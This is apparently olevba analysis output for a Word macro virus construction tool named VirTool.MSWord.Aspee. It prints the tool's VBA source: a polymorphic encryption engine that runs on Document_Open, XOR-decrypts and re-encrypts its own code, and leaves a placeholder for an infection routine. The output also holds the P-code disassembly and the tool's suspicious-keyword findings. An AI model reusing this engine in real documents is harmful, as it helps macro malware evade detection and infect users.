olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.Aspee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.Aspee - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: VirTool.MSWord.Aspee - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
'          AntiSocial Poly-Encryption Engine v.1.0
'By Lys Kovick For The Alcoholic Anarchists of America (AAA)
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
'

Private Sub Document_Open()
For V1 = 17 To 28 '//Adjust V1 For Line Changes!
V2 = Null
V3 = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Asc((Mid(V3, 2, 1)))
V5 = V4 Xor 39
For V6 = 3 To Len(V3)
V7 = Asc(Mid(V3, V6, 1)) Xor V5
V2 = V2 & Chr(V7)
Next V6
V8 = V2
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, V8
Next V1
Call VM
End Sub
Private Sub VM()
For V1 = 17 To 28 '//Adjust V1 For Line Changes!
V2 = Null
V3 = "'" & (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Int(Rnd() * 8) + 1
For V5 = 1 To Len(V3)
V6 = Asc(Mid(V3, V5, 1)) Xor V4
V2 = V2 & Chr(V6)
Next V5
V7 = V2
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, "'" & V7
Next V1
'//Put Infection Routine Here...
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: VirTool.MSWord.Aspee
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul 1 - 2779 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1:
' 	QuoteRem 0x0000 0x003B "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
' Line #2:
' 	QuoteRem 0x0000 0x0031 "          AntiSocial Poly-Encryption Engine v.1.0"
' Line #3:
' 	QuoteRem 0x0000 0x003B "By Lys Kovick For The Alcoholic Anarchists of America (AAA)"
' Line #4:
' 	QuoteRem 0x0000 0x003B "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
' Line #5:
' 	QuoteRem 0x0000 0x0000 ""
' Line #6:
' Line #7:
' 	FuncDefn (Private Sub Document_Open())
' Line #8:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	LitDI2 0x0011 
' 	LitDI2 0x001C 
' 	For 
' 	QuoteRem 0x0012 0x001D "//Adjust V1 For Line Changes!"
' Line #9:
' 	LitVarSpecial (Null)
' 	St V2 
' Line #10:
' 	Ld V1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St V3 
' Line #11:
' 	Ld V3 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	ArgsLd Asc 0x0001 
' 	St V4 
' Line #12:
' 	Ld V4 
' 	LitDI2 0x0027 
' 	Xor 
' 	St V5 
' Line #13:
' 	StartForVariable 
' 	Ld V6 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	Ld V3 
' 	FnLen 
' 	For 
' Line #14:
' 	Ld V3 
' 	Ld V6 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld V5 
' 	Xor 
' 	St V7 
' Line #15:
' 	Ld V2 
' 	Ld V7 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St V2 
' Line #16:
' 	StartForVariable 
' 	Ld V6 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	Ld V2 
' 	St V8 
' Line #18:
' 	Ld V1 
' 	Ld V8 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #19:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	ArgsCall (Call) VM 0x0000 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Private Sub VM())
' Line #23:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	LitDI2 0x0011 
' 	LitDI2 0x001C 
' 	For 
' 	QuoteRem 0x0012 0x001D "//Adjust V1 For Line Changes!"
' Line #24:
' 	LitVarSpecial (Null)
' 	St V2 
' Line #25:
' 	LitStr 0x0001 "'"
' 	Ld V1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	Concat 
' 	St V3 
' Line #26:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St V4 
' Line #27:
' 	StartForVariable 
' 	Ld V5 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld V3 
' 	FnLen 
' 	For 
' Line #28:
' 	Ld V3 
' 	Ld V5 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld V4 
' 	Xor 
' 	St V6 
' Line #29:
' 	Ld V2 
' 	Ld V6 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St V2 
' Line #30:
' 	StartForVariable 
' 	Ld V5 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' 	Ld V2 
' 	St V7 
' Line #32:
' 	Ld V1 
' 	LitStr 0x0001 "'"
' 	Ld V7 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #33:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	QuoteRem 0x0000 0x001F "//Put Infection Routine Here..."
' Line #35:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

